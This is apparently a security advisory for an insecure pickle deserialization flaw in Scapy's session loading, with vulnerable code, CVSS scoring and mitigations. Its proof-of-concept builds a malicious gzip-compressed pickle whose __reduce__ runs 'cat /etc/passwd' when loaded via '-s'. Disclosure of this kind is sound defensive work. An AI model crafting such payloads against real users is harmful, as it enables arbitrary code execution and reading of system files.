  Scapy Session Loading Vulnerable to Arbitrary Code Execution via Untrusted Pickle Deserialization
  ### Summary

  An unsafe deserialization vulnerability in Scapy <v2.7.0 allows attackers to execute arbitrary code **when a malicious session file is locally loaded via the `-s` option**. This requires convincing a user to manually load a malicious session file.

  ---

  ### Details

  Scapy’s interactive shell supports session loading using gzip-compressed pickle files:

  ```bash
  ./run_scapy -s <session_file.pkl.gz>
  ```

  Internally, this triggers:

  ```python
  # main.py
  SESSION = pickle.load(gzip.open(session_name, "rb"))
  ```

  Since no validation or restriction is performed on the deserialized object, **any code embedded via `__reduce__()` will be executed immediately**. This makes it trivial for an attacker to drop a malicious `.pkl.gz` in a shared folder and have it executed by unsuspecting users.

  The vulnerability exists in the `load_session` function, which deserializes data using `pickle.load()` on `.pkl.gz` files provided via the `-s` CLI flag or programmatically through `conf.session`.

  **Affected lines in source code**:
  https://github.com/secdev/scapy/blob/master/scapy/main.py#L569-L572

  ```python
  try:
      s = pickle.load(gzip.open(fname, "rb"))
  except IOError:
      try:
          s = pickle.load(open(fname, "rb"))
  ```

  ---

  ### PoC

  Create a malicious payload:

  ```python
  import pickle, os, gzip

  class RCE:
      def __reduce__(self):
          return (os.system, ("cat /etc/passwd",))

  payload = gzip.compress(pickle.dumps(RCE()))

  with open("evil.pkl.gz", "wb") as f:
      f.write(payload)
  ```

  Then run Scapy with:

  ```bash
  ./run_scapy -s ./evil.pkl.gz
  ```

  Result: `cat /etc/passwd` executes immediately, before shell is shown.

  ### Impact

  This is a classic deserialization vulnerability which leads to Code Execution (CE) when untrusted data is deserialized.

  Any user who can trick another user into loading a crafted `.pkl.gz` session file (e.g. via `-s` option) can execute arbitrary Python code.

  - **Vulnerability type:** Insecure deserialization (Python `pickle`)
  - **CWE**: [CWE-502: Deserialization of Untrusted Data](https://cwe.mitre.org/data/definitions/502.html)
  - **CVSS v4.0 Vector**: `CVSS:4.0/AV:L/AC:L/AT:P/PR:L/UI:A/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N`
  - **CVSS Score**: 5.4 (Medium)
  - **Impact:** Arbitrary Code Execution
  - **Attack vector:** Local or supply chain (malicious `.pkl.gz`)
  - **Affected users:** Any user who loads session files (even interactively)
  - **Affected version:** **Scapy v2.6.1**

  ---

  ### Mitigations

  - Do not use 'sessions' (the -s option when launching Scapy).
  - Use the Scapy 2.7.0+ where the session mechanism has been removed.
